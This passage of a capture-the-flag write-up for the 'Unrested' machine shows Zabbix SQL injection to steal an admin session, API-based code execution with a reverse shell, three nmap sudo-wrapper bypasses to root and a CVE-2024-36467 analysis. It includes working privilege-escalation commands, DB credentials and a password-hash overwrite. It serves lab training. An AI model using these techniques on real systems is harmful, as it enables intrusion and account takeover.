+<h4 id="db-enumeration">DB Enumeration</h4>
+<p>Based on the success of <code class="language-plaintext highlighter-rouge">group_concat</code>, it is likely a MySQL DB. To check for sure, I’ll try string concatenation as shown on the <a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">PortSwigger CheatSheet</a>:</p>
+<picture>
+<source srcset="/img/image-20250228191651802.webp" type="image/webp"/>
+<img alt="image-20250228191651802" class="include_image" loading="lazy" src="/img/image-20250228191651802.png"/>
+</picture>
+<picture>
+<source srcset="/img/image-20250228191748913.webp" type="image/webp"/>
+<img alt="image-20250228191748913" class="include_image" loading="lazy" src="/img/image-20250228191748913.png"/>
+</picture>
+<p>That’s MySQL. <code class="language-plaintext highlighter-rouge">@@version</code> works too:</p>
+<picture>
+<source srcset="/img/image-20250228191822548.webp" type="image/webp"/>
+<img alt="image-20250228191822548" class="include_image" loading="lazy" src="/img/image-20250228191822548.png"/>
+</picture>
+<p>I can read the table names, but it’s long:</p>
+<picture>
+<source srcset="/img/image-20250228192000241.webp" type="image/webp"/>
+<img alt="image-20250228192000241" class="include_image" loading="lazy" src="/img/image-20250228192000241.png"/>
+</picture>
+<h3 id="rce">RCE</h3>
+<h4 id="strategy">Strategy</h4>
+<p>Rather than try to figure out the DB through injection, I’ll look for ways to abuse Zabbix via SQL injection. <a href="https://github.com/freeworkaz/zabbix_test/blob/master/zabbix_shell_create_on_Linux.py">This script</a> shows abusing the <code class="language-plaintext highlighter-rouge">item.create</code> API to get RCE. This does require Super Admin role.</p>
+<p>To achieve this, I’ll try to get a session as the Admin user.</p>
+<h4 id="read-admin-session">Read Admin Session</h4>
+<p>Session ids are held in the <code class="language-plaintext highlighter-rouge">sessions</code> table in the <code class="language-plaintext highlighter-rouge">sessiondid</code> column. I only want the session from the Admin user (which I’ve observed to have a  <code class="language-plaintext highlighter-rouge">userid</code> of 1), so I can limit to that and drop the <code class="language-plaintext highlighter-rouge">group_concat</code>:</p>
+<picture>
+<source srcset="/img/image-20250228193150225.webp" type="image/webp"/>
+<img alt="image-20250228193150225" class="include_image" loading="lazy" src="/img/image-20250228193150225.png"/>
+</picture>
+<p>It works!</p>
+<picture>
+<source srcset="/img/image-20250228193402091.webp" type="image/webp"/>
+<img alt="image-20250228193402091" class="include_image" loading="lazy" src="/img/image-20250228193402091.png"/>
+</picture>
+<h4 id="rce-poc">RCE POC</h4>
+<p>To execute a command, I need to have a <code class="language-plaintext highlighter-rouge">hostid</code>. I’ll use the <code class="language-plaintext highlighter-rouge">host.get</code> API to list the hosts (which now works as admin):</p>
+<picture>
+<source srcset="/img/image-20250228194431256.webp" type="image/webp"/>
+<img alt="image-20250228194431256" class="include_image" loading="lazy" src="/img/image-20250228194431256.png"/>
+</picture>
+<p>I’ll need the <code class="language-plaintext highlighter-rouge">hostid</code> and the <code class="language-plaintext highlighter-rouge">interfaceid</code> for the command execution.</p>
+<p>To create the item, I’ll use the command from the <a href="https://github.com/freeworkaz/zabbix_test/blob/master/zabbix_shell_create_on_Linux.py">script POC</a>. I’ll start with a simple <code class="language-plaintext highlighter-rouge">curl</code> to make sure it works:</p>
+<picture>
+<source srcset="/img/image-20250228194749848.webp" type="image/webp"/>
+<img alt="image-20250228194749848" class="include_image" loading="lazy" src="/img/image-20250228194749848.png"/>
+</picture>
+<p>It takes a minute or so to process, but then I get a request at my server:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">10.10.11.50 - - [01/Mar/2025 00:48:02] code 404, message File not found
+10.10.11.50 - - [01/Mar/2025 00:48:02] "GET /rce HTTP/1.1" 404 -
+</span></code></pre></div></div>
+<h4 id="reverse-shell">Reverse Shell</h4>
+<p>I’ll update the command to a reverse shell:</p>
+<picture>
+<source srcset="/img/image-20250228194923402.webp" type="image/webp"/>
+<img alt="image-20250228194923402" class="include_image" loading="lazy" src="/img/image-20250228194923402.png"/>
+</picture>
+<p>After a short wait, I get a shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">Listening on 0.0.0.0 443
+Connection received on 10.10.11.50 60818
+bash: cannot set terminal process group (2809): Inappropriate ioctl for device
+bash: no job control in this shell
+</span><span class="gp">zabbix@unrested:/$</span><span class="w">
+</span></code></pre></div></div>
+<p>I’ll upgrade it using the <a href="https://www.youtube.com/watch?v=DqE6DxqJg8Q">standard trick</a>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">zabbix@unrested:/$</span><span class="w"> </span>script /dev/null <span class="nt">-c</span> bash
+<span class="go">script /dev/null -c bash
+Script started, output log file is '/dev/null'.
+</span><span class="gp">zabbix@unrested:/$</span><span class="w"> </span>^Z
+<span class="go">[1]+  Stopped                 nc -lnvp 443
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
+<span class="go">nc -lnvp 443
+            reset
+reset: unknown terminal type unknown
+Terminal type? screen
+</span><span class="gp">zabbix@unrested:/$</span><span class="w"> 
+</span></code></pre></div></div>
+<p>zabbix is able to read <code class="language-plaintext highlighter-rouge">user.txt</code> from <code class="language-plaintext highlighter-rouge">/home/matthew</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">zabbix@unrested:/home/matthew$</span><span class="w"> </span><span class="nb">cat </span>user.txt
+<span class="go">262e6aa3************************
+</span></code></pre></div></div>
+<h2 id="shell-as-root">Shell as root</h2>
+<h3 id="enumeration">Enumeration</h3>
+<p>The zabbix user is able to run <code class="language-plaintext highlighter-rouge">nmap</code> as any user without a password:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">zabbix@unrested:/home/matthew$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="go">Matching Defaults entries for zabbix on unrested:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User zabbix may run the following commands on unrested:
+    (ALL : ALL) NOPASSWD: /usr/bin/nmap *
+</span></code></pre></div></div>
+<h3 id="fails">Fails</h3>
+<h4 id="script-mode--interactive--file-input">Script Mode / Interactive / File Input</h4>
+<p>A command technique to get execution through <code class="language-plaintext highlighter-rouge">nmap</code> is using the <code class="language-plaintext highlighter-rouge">--script</code> argument. I’ll create a dummy script:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">zabbix@unrested:~$</span><span class="w"> </span><span class="nb">echo</span> <span class="s1">'os.execute("/bin/bash")'</span> <span class="o">&gt;</span> test.sh
+</code></pre></div></div>
+<p>This will just return a shell when run. Now run <code class="language-plaintext highlighter-rouge">nmap</code> and pass it the script:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">zabbix@unrested:~$</span><span class="w"> </span><span class="nb">sudo </span>nmap <span class="nt">--script</span><span class="o">=</span>test.sh            
+<span class="go">Script mode is disabled for security reasons.
+</span></code></pre></div></div>
+<p>The same thing happens when trying to run <code class="language-plaintext highlighter-rouge">nmap</code> with <code class="language-plaintext highlighter-rouge">--interactive</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">zabbix@unrested:~$</span><span class="w"> </span><span class="nb">sudo </span>nmap <span class="nt">--interactive</span>
+<span class="go">Interactive mode is disabled for security reasons.
+</span></code></pre></div></div>
+<p>Another trick I might try is <code class="language-plaintext highlighter-rouge">-iL /root/root.txt</code>, which would use the contents of <code class="language-plaintext highlighter-rouge">root.txt</code> as a target and it would be printed back to the console. It’s blocked as well:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">zabbix@unrested:~$ </span><span class="nb">sudo </span>nmap <span class="nt">-iL</span> /root/root.txt
+<span class="go">File input mode is disabled for security reasons.
+</span></code></pre></div></div>
+<h4 id="restrictive-nmap-for-zabbix">Restrictive nmap for Zabbix</h4>
+<p><code class="language-plaintext highlighter-rouge">/usr/bin/nmap</code> is not actually the <code class="language-plaintext highlighter-rouge">nmap</code> binary, but a Bash script:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">zabbix@unrested:~$ </span><span class="nb">cat</span> /usr/bin/nmap                          
+<span class="c">#!/bin/bash
+#################################
+## Restrictive nmap for Zabbix ##
+#################################
+# List of restricted options and corresponding error messages
+</span><span class="go">declare -A RESTRICTED_OPTIONS=(
+    ["--interactive"]="Interactive mode is disabled for security reasons."
+    ["--script"]="Script mode is disabled for security reasons."
+    ["-oG"]="Scan outputs in Greppable format are disabled for security reasons."
+    ["-iL"]="File input mode is disabled for security reasons."
+</span><span class="c"># Check if any restricted options are used
+</span><span class="go">for option in "${!RESTRICTED_OPTIONS[@]}"; do
+    if [[ "$*" == *"$option"* ]]; then
+        echo "${RESTRICTED_OPTIONS[$option]}"
+        exit 1
+    fi
+done
+</span><span class="c"># Execute the original nmap binary with the provided arguments
+</span><span class="go">exec /usr/bin/nmap.original "$@"
+</span></code></pre></div></div>
+<p>It checks if any of the <code class="language-plaintext highlighter-rouge">RESTRICTED_OPTIONS</code> strings are in the command run, it prints the error and exits. If none of these are present, then it runs <code class="language-plaintext highlighter-rouge">/usr/bin/nmap.original</code>.</p>
+<h3 id="success">Success</h3>
+<p>I’ll show three ways to get <code class="language-plaintext highlighter-rouge">root.txt</code> using <code class="language-plaintext highlighter-rouge">nmap</code>:</p>
+<pre><code class="language-mermaid">flowchart TD;
+    subgraph identifier[" "]
+      direction LR
+      start1[ ] ---&gt;|intended| stop1[ ]
+      style start1 height:0px;
+      style stop1 height:0px;
+      start2[ ] ---&gt;|unintended| stop2[ ]
+      style start2 height:0px;
+      style stop2 height:0px;
+    end
+    A--&gt;F(&lt;a href='#one-dash-script'&gt;One dash\nscript&lt;/a&gt;);
+    F--&gt;C;
+    A[Shell as zabbix]--&gt;B(&lt;a href='#data-directory'&gt;Data Directory&lt;/a&gt;);
+    B--&gt;C[Shell as root];
+    A--&gt;D(&lt;a href='#exclude-file'&gt;Exclude File&lt;/a&gt;);
+    D--&gt;E[Read root.txt];
+
+linkStyle default stroke-width:2px,stroke:#FFFF99,fill:none;
+linkStyle 1,2,3,6,7 stroke-width:2px,stroke:#4B9CD3,fill:none;
+style identifier fill:#1d1d1d,color:#FFFFFFFF;
+</code></pre>
+<h4 id="one-dash-script">One Dash Script</h4>
+<p>The easiest way to get root from here is a twist on the <code class="language-plaintext highlighter-rouge">--script</code> argument. <code class="language-plaintext highlighter-rouge">nmap</code> is nice enough to handle <code class="language-plaintext highlighter-rouge">-script</code> just as it would <code class="language-plaintext highlighter-rouge">--script</code>. But the wrapper script isn’t checking for that!</p>
+<p>So I can:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">zabbix@unrested:~$</span><span class="w"> </span><span class="nb">echo</span> <span class="s1">'os.execute("/bin/bash")'</span> <span class="o">&gt;</span> test.sh
+<span class="gp">zabbix@unrested:~$</span><span class="w"> </span><span class="nb">sudo </span>nmap <span class="nt">-script</span><span class="o">=</span>test.sh                
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-01 01:17 UTC
+NSE: Warning: Loading 'test.sh' -- the recommended file extension is '.nse'.
+</span><span class="gp">root@unrested:/var/lib/zabbix#</span><span class="w"> </span>reset: unknown terminal <span class="nb">type </span>unknown
+<span class="go">Terminal type? screen
+</span><span class="gp">root@unrested:/var/lib/zabbix#</span><span class="w"> </span><span class="nb">id</span>
+<span class="go">uid=0(root) gid=0(root) groups=0(root)
+</span></code></pre></div></div>
+<p>When I first get a root prompt out of <code class="language-plaintext highlighter-rouge">nmap</code>, nothing I type is shown, but a <code class="language-plaintext highlighter-rouge">reset</code> command fixes that and it’s a fully functional terminal, good enough to read the flag:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@unrested:/var/lib/zabbix#</span><span class="w"> </span><span class="nb">cat</span> /root/root.txt
+<span class="go">2111a8ca************************
+</span></code></pre></div></div>
+<h4 id="data-directory">Data Directory</h4>
+<p>The intended path for this box is to abuse the <code class="language-plaintext highlighter-rouge">--datadir</code> option, which the man page for <code class="language-plaintext highlighter-rouge">nmap</code> says:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>--datadir directoryname (Specify custom Nmap data file location)
+    Nmap obtains some special data at runtime in files named nmap-service-probes, nmap-services,
+    nmap-protocols, nmap-rpc, nmap-mac-prefixes, and nmap-os-db. If the location of any of these files has
+    been specified (using the --servicedb or --versiondb options), that location is used for that file.
+    After that, Nmap searches these files in the directory specified with the --datadir option (if any). Any
+    files not found there, are searched for in the directory specified by the NMAPDIR environment variable.
+    Next comes ~/.nmap for real and effective UIDs; or on Windows, HOME\AppData\Roaming\nmap (where HOME is
+    the user's home directory, like C:\Users\user). This is followed by the location of the nmap executable
+    and the same location with ../share/nmap appended. Then a compiled-in location such as
+    /usr/local/share/nmap or /usr/share/nmap.
+</code></pre></div></div>
+<p>The default value is <code class="language-plaintext highlighter-rouge">/usr/share/nmap</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">zabbix@unrested:~$</span><span class="w"> </span><span class="nb">ls</span> /usr/share/nmap/
+<span class="go">nmap.dtd           nmap-payloads   nmap-service-probes  nselib
+nmap-mac-prefixes  nmap-protocols  nmap-services        nse_main.lua
+nmap-os-db         nmap-rpc        nmap.xsl             scripts
+</span></code></pre></div></div>
+<p>Right away <code class="language-plaintext highlighter-rouge">nse_main.lua</code> jumps out as interesting. That’s the runs every time <code class="language-plaintext highlighter-rouge">nmap</code> runs with <code class="language-plaintext highlighter-rouge">-sC</code>. So if I create a new one and tell <code class="language-plaintext highlighter-rouge">nmap</code> that that directory is the data dir, it will load that:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">zabbix@unrested:~$</span><span class="w"> </span><span class="nb">echo</span> <span class="s1">'os.execute("/bin/bash")'</span> <span class="o">&gt;</span> /tmp/nse_main.lua
+<span class="gp">zabbix@unrested:~$</span><span class="w"> </span><span class="nb">sudo</span> /usr/bin/nmap <span class="nt">--datadir</span> /tmp <span class="nt">-sC</span> localhost   
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-01 01:25 UTC
+</span><span class="gp">root@unrested:/var/lib/zabbix#</span><span class="w"> </span>reset: unknown terminal <span class="nb">type </span>unknown
+<span class="go">Terminal type? screen
+</span><span class="gp">root@unrested:/var/lib/zabbix#</span><span class="w"> </span><span class="nb">id</span>
+<span class="go">uid=0(root) gid=0(root) groups=0(root)
+</span></code></pre></div></div>
+<p>Just like above, I have to <code class="language-plaintext highlighter-rouge">reset</code> to get the terminal working, but it works! And I can read the flag:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@unrested:/var/lib/zabbix#</span><span class="w"> </span><span class="nb">cat</span> /root/root.txt
+<span class="go">2111a8ca************************
+</span></code></pre></div></div>
+<h4 id="exclude-file">Exclude File</h4>
+<p>Just like the blocked <code class="language-plaintext highlighter-rouge">-iL</code>, there’s an <code class="language-plaintext highlighter-rouge">--excludefile</code> option:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>--excludefile exclude_file (Exclude list from file)
+    This offers the same functionality as the --exclude option, except that the excluded targets are
+    provided in a newline-, space-, or tab-delimited exclude_file rather than on the command line.
+
+    The exclude file may contain comments that start with # and extend to the end of the line.
+</code></pre></div></div>
+<p>Anything that’s using a file as targets can be a file read. It works here:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">zabbix@unrested:~$</span><span class="w"> </span><span class="nb">sudo </span>nmap <span class="nt">--excludefile</span> /root/root.txt localhost
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-01 01:28 UTC
+Error resolving name "2111a8ca************************": Temporary failure in name resolution
+
+QUITTING!
+</span></code></pre></div></div>
+<p>It errors trying to treat the flag like a host and prints it!</p>
+<h2 id="beyond-root">Beyond Root</h2>
+<h3 id="cve-2024-36467">CVE-2024-36467</h3>
+<h4 id="background-1">Background</h4>
+<p>The <code class="language-plaintext highlighter-rouge">user.update</code> API is executed by the <code class="language-plaintext highlighter-rouge">update</code> function in the <code class="language-plaintext highlighter-rouge">CUser</code> class defined in <code class="language-plaintext highlighter-rouge">CUser.php</code> in the <a href="https://github.com/zabbix/zabbix/blob/7.0.0/ui/include/classes/api/services/CUser.php#L358-L363">Zabbit source</a>:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">public</span> <span class="k">function</span> <span class="n">update</span><span class="p">(</span><span class="kt">array</span> <span class="nv">$users</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">validateUpdate</span><span class="p">(</span><span class="nv">$users</span><span class="p">,</span> <span class="nv">$db_users</span><span class="p">);</span>
+    <span class="k">self</span><span class="o">::</span><span class="nf">updateForce</span><span class="p">(</span><span class="nv">$users</span><span class="p">,</span> <span class="nv">$db_users</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="p">[</span><span class="s1">'userids'</span> <span class="o">=&gt;</span> <span class="nb">array_column</span><span class="p">(</span><span class="nv">$users</span><span class="p">,</span> <span class="s1">'userid'</span><span class="p">)];</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>This is very simple code. As long as <code class="language-plaintext highlighter-rouge">$this.validateUpdate</code> returns, it will update the user.</p>
+<p>If I try to set my user’s role to Super Admin (role 3), it returns with an error message:</p>
+<picture>
+<source srcset="/img/image-20250228162726715.webp" type="image/webp"/>
+<img alt="image-20250228162726715" class="include_image" loading="lazy" src="/img/image-20250228162726715.png"/>
+</picture>
+<p>The <code class="language-plaintext highlighter-rouge">validateUpdate</code> code is very long (<a href="https://github.com/zabbix/zabbix/blob/7.0.0/ui/include/classes/api/services/CUser.php#L371-L543">lines 371-543</a>). The last line of this function calls <code class="language-plaintext highlighter-rouge">checkHimself</code> (defined on <a href="https://github.com/zabbix/zabbix/blob/7.0.0/ui/include/classes/api/services/CUser.php#L1109-L1135">lines 1109-1135</a>):</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">private</span> <span class="k">function</span> <span class="n">checkHimself</span><span class="p">(</span><span class="kt">array</span> <span class="nv">$users</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$users</span> <span class="k">as</span> <span class="nv">$user</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nb">bccomp</span><span class="p">(</span><span class="nv">$user</span><span class="p">[</span><span class="s1">'userid'</span><span class="p">],</span> <span class="k">self</span><span class="o">::</span><span class="nv">$userData</span><span class="p">[</span><span class="s1">'userid'</span><span class="p">])</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s1">'roleid'</span><span class="p">,</span> <span class="nv">$user</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$user</span><span class="p">[</span><span class="s1">'roleid'</span><span class="p">]</span> <span class="o">!=</span> <span class="k">self</span><span class="o">::</span><span class="nv">$userData</span><span class="p">[</span><span class="s1">'roleid'</span><span class="p">])</span> <span class="p">{</span>
+                <span class="k">self</span><span class="o">::</span><span class="nf">exception</span><span class="p">(</span><span class="no">ZBX_API_ERROR_PARAMETERS</span><span class="p">,</span> <span class="nf">_</span><span class="p">(</span><span class="s1">'User cannot change own role.'</span><span class="p">));</span>
+            <span class="p">}</span>
+
+            <span class="k">if</span> <span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s1">'usrgrps'</span><span class="p">,</span> <span class="nv">$user</span><span class="p">))</span> <span class="p">{</span>
+                <span class="nv">$db_usrgrps</span> <span class="o">=</span> <span class="no">DB</span><span class="o">::</span><span class="nf">select</span><span class="p">(</span><span class="s1">'usrgrp'</span><span class="p">,</span> <span class="p">[</span>
+                    <span class="s1">'output'</span> <span class="o">=&gt;</span> <span class="p">[</span><span class="s1">'gui_access'</span><span class="p">,</span> <span class="s1">'users_status'</span><span class="p">],</span>
+                    <span class="s1">'usrgrpids'</span> <span class="o">=&gt;</span> <span class="nf">zbx_objectValues</span><span class="p">(</span><span class="nv">$user</span><span class="p">[</span><span class="s1">'usrgrps'</span><span class="p">],</span> <span class="s1">'usrgrpid'</span><span class="p">)</span>
+                <span class="p">]);</span>
+
+                <span class="k">foreach</span> <span class="p">(</span><span class="nv">$db_usrgrps</span> <span class="k">as</span> <span class="nv">$db_usrgrp</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="k">if</span> <span class="p">(</span><span class="nv">$db_usrgrp</span><span class="p">[</span><span class="s1">'gui_access'</span><span class="p">]</span> <span class="o">==</span> <span class="no">GROUP_GUI_ACCESS_DISABLED</span>
+                            <span class="o">||</span> <span class="nv">$db_usrgrp</span><span class="p">[</span><span class="s1">'users_status'</span><span class="p">]</span> <span class="o">==</span> <span class="no">GROUP_STATUS_DISABLED</span><span class="p">)</span> <span class="p">{</span>
+                        <span class="k">self</span><span class="o">::</span><span class="nf">exception</span><span class="p">(</span><span class="no">ZBX_API_ERROR_PARAMETERS</span><span class="p">,</span>
+                            <span class="nf">_</span><span class="p">(</span><span class="s1">'User cannot add himself to a disabled group or a group with disabled GUI access.'</span><span class="p">)</span>
+                        <span class="p">);</span>
+                    <span class="p">}</span>
+                <span class="p">}</span>
+            <span class="p">}</span>
+
+            <span class="k">break</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>At the top, it checks if the <code class="language-plaintext highlighter-rouge">roleid</code> key is in the data, and if so, there’s a check to see that the logged in user doesn’t match the user in the data.</p>
+<p>That same check isn’t made if <code class="language-plaintext highlighter-rouge">usrgrps</code> exists in the update. It only checks if the target group is disabled.</p>
+<h4 id="execute">Execute</h4>
+<p>To run this, I’ll hit the <code class="language-plaintext highlighter-rouge">user.update</code> API with new groups. It doesn’t return an error, which indicates success:</p>
+<picture>
+<source srcset="/img/image-20250228163212586.webp" type="image/webp"/>
+<img alt="image-20250228163212586" class="include_image" loading="lazy" src="/img/image-20250228163212586.png"/>
+</picture>
+<p>If I query <code class="language-plaintext highlighter-rouge">user.get</code> now, the result is different:</p>
+<picture>
+<source srcset="/img/image-20250228163306417.webp" type="image/webp"/>
+<img alt="image-20250228163306417" class="include_image" loading="lazy" src="/img/image-20250228163306417.png"/>
+</picture>
+<p>It’s showing all the users now. Scrolling down to matthew, they are in the Zabbix Administrators group:</p>
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+  </span><span class="nl">"userid"</span><span class="p">:</span><span class="s2">"3"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"username"</span><span class="p">:</span><span class="s2">"matthew"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"name"</span><span class="p">:</span><span class="s2">"Matthew"</span><span class="p">,</span><span class="w">
+  </span><span class="err">...</span><span class="p">[</span><span class="err">snip</span><span class="p">]</span><span class="err">...</span><span class="w">
+  </span><span class="nl">"usrgrps"</span><span class="p">:[</span><span class="w">
+    </span><span class="p">{</span><span class="nl">"usrgrpid"</span><span class="p">:</span><span class="s2">"7"</span><span class="p">,</span><span class="nl">"name"</span><span class="p">:</span><span class="s2">"Zabbix administrators"</span><span class="p">},</span><span class="w">
+    </span><span class="p">{</span><span class="nl">"usrgrpid"</span><span class="p">:</span><span class="s2">"13"</span><span class="p">,</span><span class="nl">"name"</span><span class="p">:</span><span class="s2">"Internal"</span><span class="p">}</span><span class="w">
+  </span><span class="p">]</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+<h4 id="deadend">Deadend</h4>
+<p>For Unrested, being in the Zabbix Administrators group doesn’t really buy me anything. Logging back into the GUI, I still can’t see much of a difference.</p>
+<p>The real top privilege comes with the Super Admin role (which I’ll show <a href="#super-admin">below</a>). I do have access to more API endpoints, but they aren’t ones that seem to buy much. Logging into the GUI doesn’t show anything different to exploit.</p>
+<p>There are likely some common misconfigurations that a Super Admin could make that would give this group some way to do something nefarious from here, but in this relatively default configuration, it’s a dead end.</p>
+<h3 id="super-admin">Super Admin</h3>
+<h4 id="get-role">Get Role</h4>
+<p>To see the Super Admin role and how it differs from the Zabbix Administrators group, I’ll go into the database. The Zabbix DB config information is in <code class="language-plaintext highlighter-rouge">/etc/zabbix/zabbix_server.conf</code>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...[snip]...
+<span class="nv">DBName</span><span class="o">=</span>zabbix
+...[snip]...
+<span class="nv">DBUser</span><span class="o">=</span>zabbix
+...[snip]...
+<span class="nv">DBPassword</span><span class="o">=</span>ZabberzPassword2024!
+...[snip]...
+</code></pre></div></div>
+<p>I’ll connect to <code class="language-plaintext highlighter-rouge">mysql</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@unrested:/etc/zabbix#</span><span class="w"> </span>mysql <span class="nt">-u</span> zabbix <span class="nt">-pZabberzPassword2024</span><span class="o">!</span>
+<span class="go">...[snip]...
+</span><span class="gp">MariaDB [(none)]&gt;</span><span class="w"> </span>use zabbix                               
+<span class="go">...[snip]...
+</span><span class="gp">MariaDB [zabbix]&gt;</span><span class="w">
+</span></code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">users</code> table has three users, as I saw during the injection:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">MariaDB [zabbix]&gt; </span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span><span class="p">;</span>                                                                                <span class="o">+</span><span class="c1">--------+----------+---------+---------------+--------------------------------------------------------------+-----+--</span>
+<span class="go">---------+------------+---------+---------+---------+----------------+------------+---------------+---------------+---
+-------+--------+-----------------+----------------+
+| userid | username | name    | surname       | passwd                                                       | url | a
+utologin | autologout | lang    | refresh | theme   | attempt_failed | attempt_ip | attempt_clock | rows_per_page | ti
+mezone | roleid | userdirectoryid | ts_provisioned |       
++--------+----------+---------+---------------+--------------------------------------------------------------+-----+--
+---------+------------+---------+---------+---------+----------------+------------+---------------+---------------+---
+-------+--------+-----------------+----------------+       
+|      1 | Admin    | Zabbix  | Administrator | $2y$10$L8UqvYPqu6d7c8NeChnxWe1.w6ycyBERr8UgeUYh.3AO7ps3zer2a |     |  
+       1 | 0          | default | 30s     | default |              0 |            |             0 |            50 | de
+fault  |      3 |            NULL |              0 |
+|      2 | guest    |         |               | $2y$10$89otZrRNmde97rIyzclecuk6LwKAsHN0BcvoOKGjbT.BwMBfm7G06 |     |  
+       0 | 15m        | default | 30s     | default |              0 |            |             0 |            50 | de
+fault  |      4 |            NULL |              0 |
+|      3 | matthew  | Matthew | Smith         | $2y$10$e2IsM6YkVvyLX43W5CVhxeA46ChWOUNRzSdIyVzKhRTK00eGq4SwS |     |  
+       1 | 0          | default | 30s     | default |              0 |            |             0 |            50 | de
+fault  |      1 |            NULL |              0 |
++--------+----------+---------+---------------+--------------------------------------------------------------+-----+--
+---------+------------+---------+---------+---------+----------------+------------+---------------+---------------+---
+-------+--------+-----------------+----------------+
+3 rows in set (0.001 sec)
+</span></code></pre></div></div>
+<p>I’ll set the Admin user to have the same password as matthew:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">MariaDB [zabbix]&gt; </span><span class="k">update</span> <span class="n">users</span> <span class="k">set</span> <span class="n">passwd</span> <span class="o">=</span> <span class="s1">'$2y$10$e2IsM6YkVvyLX43W5CVhxeA46ChWOUNRzSdIyVzKhRTK00eGq4SwS'</span> <span class="k">where</span> <span class="n">userid</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+<span class="go">Query OK, 1 row affected (0.001 sec)
+Rows matched: 1  Changed: 1  Warnings: 0
+</span></code></pre></div></div>
+<p>It worked:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">MariaDB [zabbix]&gt; </span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span><span class="p">;</span>                                           
+<span class="go">+--------+----------+---------+---------------+--------------------------------------------------------------+-----+--
+---------+------------+---------+---------+---------+----------------+------------+---------------+---------------+---
+-------+--------+-----------------+----------------+
+| userid | username | name    | surname       | passwd                                                       | url | a
+utologin | autologout | lang    | refresh | theme   | attempt_failed | attempt_ip | attempt_clock | rows_per_page | ti
+mezone | roleid | userdirectoryid | ts_provisioned |
++--------+----------+---------+---------------+--------------------------------------------------------------+-----+--
+---------+------------+---------+---------+---------+----------------+------------+---------------+---------------+---
+-------+--------+-----------------+----------------+
+|      1 | Admin    | Zabbix  | Administrator | $2y$10$e2IsM6YkVvyLX43W5CVhxeA46ChWOUNRzSdIyVzKhRTK00eGq4SwS |     |  
+       1 | 0          | default | 30s     | default |              0 |            |             0 |            50 | de
+fault  |      3 |            NULL |              0 |
+|      2 | guest    |         |               | $2y$10$89otZrRNmde97rIyzclecuk6LwKAsHN0BcvoOKGjbT.BwMBfm7G06 |     |  
